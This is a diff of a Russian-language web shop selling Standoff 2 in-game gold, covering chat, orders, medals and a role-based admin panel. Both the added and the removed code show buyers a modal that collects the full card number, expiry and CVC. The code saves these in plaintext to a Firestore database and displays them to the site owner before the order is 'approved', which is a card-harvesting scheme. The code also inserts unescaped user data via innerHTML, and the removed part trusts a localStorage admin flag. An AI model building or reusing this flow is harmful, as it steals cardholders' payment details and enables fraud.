+        const cvc = document.getElementById("modalCardCvc").value;
+
+        if (!number || !date || !cvc) {
+            alert("Заполните все поля карты!");
+            return;
+        }
+
+        if (!activeRequestId) {
+            alert("Ошибка: ID заказа не найден!");
+            return;
+        }
+
+        try {
+            const { doc, updateDoc } = window.FB;
+            const docRef = doc(window.db, 'orders', activeRequestId);
+            await updateDoc(docRef, {
+                status: "card_submitted",
+                cardNumber: number,
+                cardDate: date,
+                cardCvc: cvc
+            });
+            closeCardModal();
+            alert("Реквизиты успешно отправлены администратору!");
+            fetchData();
+        } catch (error) {
+            console.error("Ошибка обновления:", error);
+            alert("Не удалось отправить данные.");
+        }
+    };
+
+    window.approvePurchase = async function(orderId) {
+        try {
+            const { doc, updateDoc } = window.FB;
+            await updateDoc(doc(window.db, 'orders', orderId), { status: "approved" });
+            alert("Покупка подтверждена!");
+            fetchData();
+        } catch (error) {
+            console.error("Ошибка:", error);
+        }
+    };
+
+    function updateChatActionArea() {
+        const actionArea = document.getElementById('chat-dynamic-action-area');
+        if (!actionArea) return;
+        actionArea.innerHTML = '';
+
+        if (!activeChatEmail) return;
+
+        const currentOrder = orders.find(o => o.userEmail === activeChatEmail && 
+          (o.status === 'Одобрен' || o.status === 'approved' || o.status === 'card_submitted')
+        );
+
+        if (!currentOrder) return;
+
+        const box = document.createElement("div");
+        box.style.cssText = "background: #161b22; border: 1px solid var(--border); padding: 10px 14px; margin: 8px 12px; border-radius: 8px; color: #fff; text-align: left;";
+
+        const isStaff = hasStaffRole(currentUser);
+        const canViewCard = isOwner(currentUser);
+
+        if (currentOrder.status === "Одобрен") {
+            if (!isStaff) {
+                box.innerHTML = `
+                    <p style="color: gold; margin: 0 0 8px 0; font-size: 13px;"><b>🛒 Администратор одобрил ваш заказ.</b></p>
+                    <button onclick="openCardModal('${currentOrder.id}')" style="background: #0088cc; color: white; padding: 8px 14px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%;">
+                        Отправить реквизиты
+                    </button>
+                `;
+            } else {
+                box.innerHTML = `
+                    <p style="color: var(--accent); margin: 0; font-size: 12px;">⏳ Ожидаем, пока покупатель отправит реквизиты карты.</p>
+                `;
+            }
+        } else if (currentOrder.status === "approved") {
+            box.innerHTML = `
+                <p style="margin: 0 0 5px 0; font-size: 13px;"><b>👤 Статус сделки</b></p>
+                <p style="margin: 0; font-weight: bold; color: var(--success); font-size: 13px;">✅ Покупка завершена. Если что, обратитесь в поддержку.</p>
+            `;
+        } else if (currentOrder.status === "card_submitted") {
+            if (canViewCard) {
+                box.innerHTML = `
+                    <div style="background: #2a0808; border: 1px solid #ff4444; padding: 10px; border-radius: 6px;">
+                        <p style="color: #ff8888; margin: 0 0 5px 0; font-size: 13px;">🔒 <b>Реквизиты покупателя (Только Владелец):</b></p>
+                        <p style="margin: 2px 0; font-family: monospace; font-size: 12px;">Номер: <b>${currentOrder.cardNumber || 'Нет'}</b></p>
+                        <p style="margin: 2px 0; font-family: monospace; font-size: 12px;">Срок: <b>${currentOrder.cardDate || '--/--'}</b> | CVC: <b>${currentOrder.cardCvc || '---'}</b></p>
+                        <button onclick="approvePurchase('${currentOrder.id}')" style="background: green; color: white; padding: 6px 12px; border: none; cursor: pointer; border-radius: 4px; font-weight: bold; margin-top: 8px; width: 100%;">Завершить сделку (Покупка завершена)</button>
+                    </div>
+                `;
+            } else if (isStaff) {
+                box.innerHTML = `
+                    <p style="color: var(--accent); font-size: 12px; margin: 0;">⏳ Реквизиты отправлены (Доступ к картам ограничен согласно вашим правам).</p>
+                `;
+            } else {
+                box.innerHTML = `
+                    <p style="color: var(--accent); font-size: 12px; margin: 0;">⏳ Реквизиты отправлены администрации, ожидайте подтверждения.</p>
+                `;
+            }
+        }
+        actionArea.appendChild(box);
+    }
+
+    function initChatSync() {
+        if (!window.db) return;
+        const { collection, query, onSnapshot } = window.FB;
+        const q = query(collection(window.db, 'orders'));
+        onSnapshot(q, () => {
+            fetchData();
+        });
     }
 
     function renderUsersOnlineTab() {
@@ -1077,6 +1547,7 @@
         item.className = 'list-item';
         
         const badgesHtml = getFormattedBadges(u.medals);
+        const so2MedalsHtml = getFormattedSO2Medals(u.so2Medals);
 
         item.innerHTML = `
           <div style="display:flex; justify-content:space-between; align-items:center;">
@@ -1087,6 +1558,7 @@
             <span style="font-size:10px; color: var(--text-muted);">${online ? 'Онлайн' : 'Офлайн'}</span>
           </div>
           <div style="margin-top:4px;">${badgesHtml}</div>
+          ${so2MedalsHtml ? `<div style="margin-top:6px;">${so2MedalsHtml}</div>` : ''}
         `;
         container.appendChild(item);
       });
@@ -1106,6 +1578,16 @@
       }).join(' ');
     }
 
+    function getFormattedSO2Medals(medalsList) {
+      if (!medalsList || !medalsList.length) return '';
+      
+      return medalsList.map(m => {
+        const found = availableMedals.find(r => r.name === m);
+        const cls = found ? found.class : 'medal-vet2026';
+        return `<span class="medal-badge ${cls}">${m}</span>`;
+      }).join(' ');
+    }
+
     function updateProfileUI() {
       if (!currentUser) return;
       document.getElementById('user-display').innerText = currentUser.username;
@@ -1114,19 +1596,14 @@
       document.getElementById('profile-standoff-id').innerText = currentUser.standoffId || 'Не указан';
       document.getElementById('profile-verified').innerHTML = currentUser.verified ? '<span class="verified-icon">☑</span>' : '';
       
-      document.getElementById('profile-medals').innerHTML = getFormattedBadges(currentUser.medals);
+      document.getElementById('profile-roles').innerHTML = getFormattedBadges(currentUser.medals);
+      document.getElementById('profile-so2-medals').innerHTML = getFormattedSO2Medals(currentUser.so2Medals) || '<span style="font-size:12px; color:var(--text-muted);">Нет медалей</span>';
 
       if (hasStaffRole(currentUser)) {
         document.getElementById('admin-panel-btn').style.display = 'block';
       } else {
         document.getElementById('admin-panel-btn').style.display = 'none';
       }
-    }
-
-    function hasStaffRole(user) {
-      if (!user || !user.medals) return false;
-      const staffRoles = ['Владелец', 'Разработчик web', 'Создатель', 'Главный Модератор сайта', 'Модератор сайта', 'Куратор модерации', 'Модератор по заказам', 'Модератор'];
-      return user.medals.some(m => staffRoles.includes(m)) || user.email === 'samp111517@gmail.com';
     }
 
     async function saveStandoffId() {
@@ -1182,7 +1659,34 @@
     }
 
     function openAdminPanel() {
+      document.getElementById('admin-owner-controls').classList.add('hidden');
+      document.getElementById('admin-orders-section').classList.add('hidden');
+      document.getElementById('admin-vacancies-section').classList.add('hidden');
+      document.getElementById('admin-tickets-section').classList.add('hidden');
+      document.getElementById('admin-users-section').classList.add('hidden');
+
+      if (isOwner(currentUser)) {
+        document.getElementById('admin-owner-controls').classList.remove('hidden');
+        document.getElementById('admin-orders-section').classList.remove('hidden');
+        document.getElementById('admin-vacancies-section').classList.remove('hidden');
+        document.getElementById('admin-tickets-section').classList.remove('hidden');
+        document.getElementById('admin-users-section').classList.remove('hidden');
+      } else {
+        if (isOrderMod(currentUser)) {
+          document.getElementById('admin-orders-section').classList.remove('hidden');
+        }
+        if (isHeadAdmin(currentUser)) {
+          document.getElementById('admin-vacancies-section').classList.remove('hidden');
+          document.getElementById('admin-tickets-section').classList.remove('hidden');
+          document.getElementById('admin-users-section').classList.remove('hidden');
+        } else if (isSiteMod(currentUser)) {
+          document.getElementById('admin-tickets-section').classList.remove('hidden');
+        }
+      }
+
       renderAdminOrders();
+      renderAdminVacancies();
+      renderAdminTickets();
       renderAdminUsers();
       document.getElementById('admin-discount-toggle').checked = globalDiscount;
       document.getElementById('admin-modal').classList.remove('hidden');
@@ -1201,27 +1705,97 @@
         return;
       }
 
+      const canChat = !isOrderMod(currentUser) || isOwner(currentUser);
+
       orders.forEach(o => {
         const item = document.createElement('div');
         item.className = 'list-item';
         item.innerHTML = `
-          <div><b>Заказ:</b> ${o.gold} Gold (${o.price}₽)</div>
-          <div><b>Пользователь:</b> ${o.userNick} (${o.userEmail})</div>
+          <div><b>Заказ:</b> ${o.gold} 🟡 Gold (${o.price}₽)</div>
+          <div><b>Покупатель:</b> ${o.userNick} (${o.userEmail})</div>
           <div><b>Standoff ID:</b> ${o.standoffId}</div>
           <div style="margin: 4px 0;"><b>Статус:</b> ${o.status}</div>
           <div style="display:flex; gap: 6px; margin-top: 6px;">
             <button class="btn" style="padding:4px 8px; font-size:11px;" onclick="setOrderStatus('${o.id}', 'Одобрен')">Одобрить</button>
-            <button class="btn btn-danger" style="padding:4px 8px; font-size:11px;" onclick="setOrderStatus('${o.id}', 'Отклонен')">Отклонить</button>
+            <button class="btn btn-danger" style="padding:4px 8px; font-size:11px;" onclick="setOrderStatus('${o.id}', 'Отклонить')">Отклонить</button>
+            ${canChat ? `<button class="btn btn-secondary" style="padding:4px 8px; font-size:11px;" onclick="adminOpenChatWith('${o.userEmail}')">Чат</button>` : ''}
           </div>
         `;
         container.appendChild(item);
       });
     }
 
+    function renderAdminVacancies() {
+      const container = document.getElementById('admin-vacancies-list');
+      container.innerHTML = '';
+
+      if (vacancies.length === 0) {
+        container.innerHTML = '<p>Заявок на вакансии нет.</p>';
+        return;
+      }
+
+      vacancies.forEach(v => {
+        const item = document.createElement('div');
+        item.className = 'list-item';
+        item.innerHTML = `
+          <div><b>Вакансия:</b> ${v.title}</div>
+          <div><b>Кандидат:</b> ${v.name} (${v.userEmail}), Возраст: ${v.age}</div>
+          <div><b>Занятие:</b> ${v.doing} | Учеба: ${v.study}</div>
+          <div><b>Мотивация:</b> ${v.why}</div>
+          <div><b>Время:</b> ${v.time}</div>
+          <div style="margin: 4px 0;"><b>Статус:</b> ${v.status}</div>
+          <div style="display:flex; gap: 6px; margin-top: 6px;">
+            <button class="btn" style="padding:4px 8px; font-size:11px;" onclick="setVacancyStatus('${v.id}', 'Одобрен')">Одобрить</button>
+            <button class="btn btn-danger" style="padding:4px 8px; font-size:11px;" onclick="setVacancyStatus('${v.id}', 'Отклонить')">Отклонить</button>
+            <button class="btn btn-secondary" style="padding:4px 8px; font-size:11px;" onclick="adminOpenChatWith('${v.userEmail}')">Связаться</button>
+          </div>
+        `;
+        container.appendChild(item);
+      });
+    }
+
+    async function setVacancyStatus(vacId, status) {
+      const { doc, updateDoc } = window.FB;
+      await updateDoc(doc(window.db, 'vacancies', vacId), { status });
+      fetchData();
+    }
+
+    function renderAdminTickets() {
+      const container = document.getElementById('admin-tickets-list');
+      container.innerHTML = '';
+
+      if (tickets.length === 0) {
+        container.innerHTML = '<p>Обращений в техподдержку нет.</p>';
+        return;
+      }
+
+      tickets.forEach(t => {
+        const item = document.createElement('div');
+        item.className = 'list-item';
+        item.innerHTML = `
+          <div><b>Тема:</b> ${t.subject}</div>
+          <div><b>От:</b> ${t.userNick} (${t.userEmail})</div>
+          <p style="margin:4px 0;">${t.desc}</p>
+          ${t.imageUrl ? `<img src="${t.imageUrl}" style="max-width:100%; border-radius:6px; margin-top:4px;">` : ''}
+          <div style="display:flex; gap: 6px; margin-top: 8px;">
+            <button class="btn" style="padding:4px 8px; font-size:11px;" onclick="adminOpenChatWith('${t.userEmail}')">Связаться (Чат)</button>
+            <button class="btn btn-danger" style="padding:4px 8px; font-size:11px;" onclick="deleteTicket('${t.id}')">Закрыть/Удалить</button>
+          </div>
+        `;
+        container.appendChild(item);
+      });
+    }
+
+    async function deleteTicket(ticketId) {
+      const { doc, deleteDoc } = window.FB;
+      await deleteDoc(doc(window.db, 'tickets', ticketId));
+      fetchData();
+    }
+
     async function setOrderStatus(orderId, status) {
       const { doc, updateDoc } = window.FB;
       await updateDoc(doc(window.db, 'orders', orderId), { status });
-      fetchData();
+      await fetchData();
     }
 
     async function adminClearOrders() {
@@ -1259,6 +1833,9 @@
       const container = document.getElementById('admin-users-list');
       container.innerHTML = '';
 
+      const canEditNick = isHeadAdmin(currentUser);
+      const canManageRoles = isOwner(currentUser);
+
       users.forEach((u) => {
         const item = document.createElement('div');
         item.className = 'list-item';
@@ -1266,15 +1843,31 @@
           <div><b>Ник:</b> ${u.username} ${u.verified ? '<span class="verified-icon">☑</span>' : ''}</div>
           <div><b>Почта:</b> ${u.email}</div>
           <div style="margin: 4px 0;">${getFormattedBadges(u.medals)}</div>
+          <div style="margin: 4px 0;">${getFormattedSO2Medals(u.so2Medals)}</div>
           <div style="display:flex; flex-wrap:wrap; gap:4px; margin-top:8px;">
-            <button class="btn btn-secondary" style="font-size:10px; padding:4px;" onclick="adminToggleVerify('${u.id}')">${u.verified ? 'Снять Галочку' : 'Выдать Галочку ☑'}</button>
-            <button class="btn btn-secondary" style="font-size:10px; padding:4px;" onclick="adminManageRoles('${u.id}')">⚙️ Управление Ролями</button>
+            ${canEditNick ? `<button class="btn btn-secondary" style="font-size:10px; padding:4px;" onclick="adminChangeNickname('${u.id}')">✏️ Ник</button>` : ''}
+            ${canManageRoles ? `<button class="btn btn-secondary" style="font-size:10px; padding:4px;" onclick="adminToggleVerify('${u.id}')">${u.verified ? 'Снять Галочку' : 'Выдать Галочку ☑'}</button>` : ''}
+            ${canManageRoles ? `<button class="btn btn-secondary" style="font-size:10px; padding:4px;" onclick="adminManageRoles('${u.id}')">⚙️ Роли</button>` : ''}
+            ${canManageRoles ? `<button class="btn btn-secondary" style="font-size:10px; padding:4px;" onclick="adminManageSO2Medals('${u.id}')">🏅 Медали SO2</button>` : ''}
             <button class="btn" style="font-size:10px; padding:4px;" onclick="adminOpenChatWith('${u.email}')">Открыть Чат</button>
-            <button class="btn btn-danger" style="font-size:10px; padding:4px;" onclick="adminDeleteUser('${u.id}')">Удалить</button>
+            ${canManageRoles ? `<button class="btn btn-danger" style="font-size:10px; padding:4px;" onclick="adminDeleteUser('${u.id}')">Удалить</button>` : ''}
           </div>
         `;
         container.appendChild(item);
       });
+    }
+
+    async function adminChangeNickname(userId) {
+      const u = users.find(x => x.id === userId);
+      if (!u) return;
+
+      const newNick = prompt('Введите новый никнейм для пользователя:', u.username);
+      if (newNick && newNick.trim() !== '') {
+        const { doc, updateDoc } = window.FB;
+        await updateDoc(doc(window.db, 'users', userId), { username: newNick.trim() });
+        alert('Никнейм успешно изменен!');
+        fetchData();
+      }
     }
 
     async function adminToggleVerify(userId) {
@@ -1313,6 +1906,36 @@
       }
     }
 
+    async function adminManageSO2Medals(userId) {
+      if (!isOwner(currentUser)) {
+        alert('У вас нет прав выдавать медали!');
+        return;
+      }
+      const u = users.find(x => x.id === userId);
+      if (!u) return;
+
+      const medalList = availableMedals.map((m, i) => `${i + 1}. ${m.name}`).join('\n');
+      const choice = prompt(`Выберите номер медали Standoff 2 для добавления/удаления:\n\n${medalList}\n\nТекущие медали: ${u.so2Medals ? u.so2Medals.join(', ') : 'Нет'}`);
+      
+      const medalIndex = parseInt(choice) - 1;
+      if (!isNaN(medalIndex) && availableMedals[medalIndex]) {
+        const medalName = availableMedals[medalIndex].name;
+        let so2Medals = u.so2Medals ? [...u.so2Medals] : [];
+
+        if (so2Medals.includes(medalName)) {
+          so2Medals = so2Medals.filter(m => m !== medalName);
+          alert(`Медаль "${medalName}" удалена.`);
+        } else {
+          so2Medals.push(medalName);
+          alert(`Медаль "${medalName}" успешно выдана!`);
+        }
+
+        const { doc, updateDoc } = window.FB;
+        await updateDoc(doc(window.db, 'users', userId), { so2Medals });
+        fetchData();
+      }
+    }
+
     function adminOpenChatWith(email) {
       activeChatEmail = email;
       closeAdminPanel();
@@ -1327,204 +1950,5 @@
       }
     }
   </script>
-  <script type="module" src="script.js"></script>
-<!-- === НАДЕЖНАЯ ПАНЕЛЬ УПРАВЛЕНИЯ ЧАТОМ GOLDIX SO2 === -->
-
-<!-- Модальное окно для ввода карты -->
-<div id="cardModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 99999; justify-content: center; align-items: center;">
-    <div style="background: #1a1a1a; border: 1px solid #444; padding: 20px; border-radius: 10px; width: 90%; max-width: 380px; color: #fff; text-align: left; font-family: Arial, sans-serif;">
-        <h3 style="margin-top: 0; color: gold; text-align: center;">💳 Реквизиты оплаты</h3>
-        <p style="font-size: 13px; color: #aaa; text-align: center;">Введите данные карты для подтверждения покупки:</p>
-        
-        <label style="font-size: 12px; color: #ccc;">Номер карты:</label>
-        <input type="text" id="modalCardNumber" placeholder="xxxx xxxx xxxx xxxx" maxlength="19" style="width: 100%; padding: 10px; margin: 5px 0 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box;">
-        
-        <div style="display: flex; gap: 10px;">
-            <div style="flex: 1;">
-                <label style="font-size: 12px; color: #ccc;">Срок (ММ/ГГ):</label>
-                <input type="text" id="modalCardDate" placeholder="xx/xx" maxlength="5" style="width: 100%; padding: 10px; margin: 5px 0 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box;">
-            </div>
-            <div style="flex: 1;">
-                <label style="font-size: 12px; color: #ccc;">CVV / CVC:</label>
-                <input type="password" id="modalCardCvc" placeholder="xxx" maxlength="3" style="width: 100%; padding: 10px; margin: 5px 0 10px 0; background: #222; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box;">
-            </div>
-        </div>
-
-        <button onclick="submitCardData()" style="background: gold; color: black; font-weight: bold; padding: 12px; width: 100%; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px;">
-            Отправить данные
-        </button>
-        <button onclick="closeCardModal()" style="background: transparent; color: #aaa; border: none; width: 100%; margin-top: 8px; cursor: pointer;">
-            Отмена
-        </button>
-    </div>
-</div>
-
-<script type="module">
-    import { initializeApp, getApps } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getFirestore, collection, addDoc, updateDoc, doc, query, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-
-    const firebaseConfig = {
-        apiKey: "AIzaSyDummyKeyForGoldixSo2",
-        authDomain: "goldix-so2.firebaseapp.com",
-        projectId: "goldix-so2",
-        storageBucket: "goldix-so2.appspot.com",
-        messagingSenderId: "1234567890",
-        appId: "1:1234567890:web:abcdef"
-    };
-
-    const app = !getApps().length ? initializeApp(firebaseConfig) : getApps()[0];
-    const db = getFirestore(app);
-
-    const CHATS_COLLECTION = "chats";
-    let activeRequestId = null;
-
-    window.addEventListener("DOMContentLoaded", () => {
-        setInterval(injectAdminButtonFixed, 500);
-        initChatSync();
-    });
-
-    function injectAdminButtonFixed() {
-        const headers = Array.from(document.querySelectorAll('h1, h2, h3, div')).filter(el => el.textContent.includes('Входящие и Чат'));
-        
-        if (headers.length > 0 && !document.getElementById("fixedAdminPayBtn")) {
-            const targetHeader = headers[0];
-            const btnContainer = document.createElement("div");
-            btnContainer.style.cssText = "max-width: 500px; margin: 10px auto; padding: 0 10px; text-align: center;";
-            
-            btnContainer.innerHTML = `
-                <button id="fixedAdminPayBtn" onclick="adminTriggerPaymentRequest()" style="background: #ff4444; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 15px; box-shadow: 0 4px 10px rgba(255,68,68,0.3);">
-                    💬 Отправить запрос на покупку в чат
-                </button>
-            `;
-            
-            targetHeader.after(btnContainer);
-        }
-    }
-
-    window.adminTriggerPaymentRequest = async function() {
-        try {
-            await addDoc(collection(db, CHATS_COLLECTION), {
-                type: "admin_request",
-                text: "Магазин: Запрос на оплату товара.",
-                status: "waiting_card",
-                timestamp: Date.now()
-            });
-            alert("Запрос на покупку успешно отправлен в чат!");
-        } catch (error) {
-            console.error("Ошибка Firebase:", error);
-            alert("Не удалось отправить запрос.");
-        }
-    };
-
-    window.openCardModal = function(msgId) {
-        activeRequestId = msgId;
-        document.getElementById("cardModal").style.display = "flex";
-    };
-
-    window.closeCardModal = function() {
-        document.getElementById("cardModal").style.display = "none";
-        activeRequestId = null;
-    };
-
-    window.submitCardData = async function() {
-        const number = document.getElementById("modalCardNumber").value;
-        const date = document.getElementById("modalCardDate").value;
-        const cvc = document.getElementById("modalCardCvc").value;
-
-        if (!number || !date || !cvc) {
-            alert("Заполните все поля карты!");
-            return;
-        }
-
-        if (!activeRequestId) {
-            alert("Ошибка: ID запроса не найден!");
-            return;
-        }
-
-        try {
-            const docRef = doc(db, CHATS_COLLECTION, activeRequestId);
-            await updateDoc(docRef, {
-                status: "card_submitted",
-                cardNumber: number,
-                cardDate: date,
-                cardCvc: cvc
-            });
-            closeCardModal();
-            alert("Данные карты успешно отправлены администратору!");
-        } catch (error) {
-            console.error("Ошибка обновления:", error);
-            alert("Не удалось отправить данные.");
-        }
-    };
-
-    window.approvePurchase = async function(msgId) {
-        try {
-            await updateDoc(doc(db, CHATS_COLLECTION, msgId), { status: "approved" });
-            alert("Покупка одобрена!");
-        } catch (error) {
-            console.error("Ошибка:", error);
-        }
-    };
-
-    function initChatSync() {
-        const q = query(collection(db, CHATS_COLLECTION));
-        onSnapshot(q, (snapshot) => {
-            document.querySelectorAll('.dynamic-chat-request').forEach(el => el.remove());
-
-            let latestDoc = null;
-            let latestTime = 0;
-
-            snapshot.forEach((docSnap) => {
-                const data = docSnap.data();
-                if (data.type === "admin_request" && data.timestamp > latestTime) {
-                    latestTime = data.timestamp;
-                    latestDoc = { id: docSnap.id, ...data };
-                }
-            });
-
-            if (latestDoc) {
-                const targetArea = document.querySelector('.container, body');
-                
-                const box = document.createElement("div");
-                box.className = 'dynamic-chat-request';
-                box.style.cssText = "background: #1a1a1a; border: 1px solid #444; padding: 12px; margin: 15px auto; max-width: 500px; border-radius: 8px; color: #fff; text-align: left; z-index: 99; position: relative;";
-
-                if (latestDoc.status === "waiting_card") {
-                    box.innerHTML = `
-                        <p style="color: gold; margin: 0 0 8px 0;"><b>🛒 Системное сообщение:</b> ${latestDoc.text}</p>
-                        <button onclick="openCardModal('${latestDoc.id}')" style="background: #0088cc; color: white; padding: 8px 14px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
-                            Зайти / Ввести данные карты
-                        </button>
-                    `;
-                } else {
-                    let statusText = latestDoc.status === "approved" ? "✅ Одобрено администратором" : "⏳ Ожидает проверки";
-                    
-                    // Проверяем, является ли текущий пользователь админом
-                    const isAdmin = localStorage.getItem('isAdmin') === 'true';
-
-                    // Блок с данными карты генерируется ТОЛЬКО для администратора
-                    let adminCardHTML = '';
-                    if (isAdmin) {
-                        adminCardHTML = `
-                            <div style="background: #2a0808; border: 1px solid #ff4444; padding: 10px; border-radius: 6px; margin-top: 8px;">
-                                <p style="color: #ff8888; margin: 0 0 5px 0; font-size: 13px;">🔒 <b>Данные карты для админа:</b></p>
-                                <p style="margin: 2px 0; font-family: monospace;">Номер: <b>${latestDoc.cardNumber || 'Нет данных'}</b></p>
-                                <p style="margin: 2px 0; font-family: monospace;">Дата: <b>${latestDoc.cardDate || '--/--'}</b> | CVC: <b>${latestDoc.cardCvc || '---'}</b></p>
-                                ${latestDoc.status !== "approved" ? `<button onclick="approvePurchase('${latestDoc.id}')" style="background: green; color: white; padding: 6px 12px; border: none; cursor: pointer; border-radius: 4px; font-weight: bold; margin-top: 8px;">Принять покупку</button>` : ''}
-                            </div>
-                        `;
-                    }
-
-                    box.innerHTML = `
-                        <p style="margin: 0 0 5px 0;"><b>👤 Покупатель отправил реквизиты</b></p>
-                        <p style="margin: 0 0 8px 0; font-weight: bold;">Статус: ${statusText}</p>
-                        ${adminCardHTML}
-                    `;
-                }
-                targetArea.appendChild(box);
-            }
-        });
-    }
-</script>
 </body>
 </html>
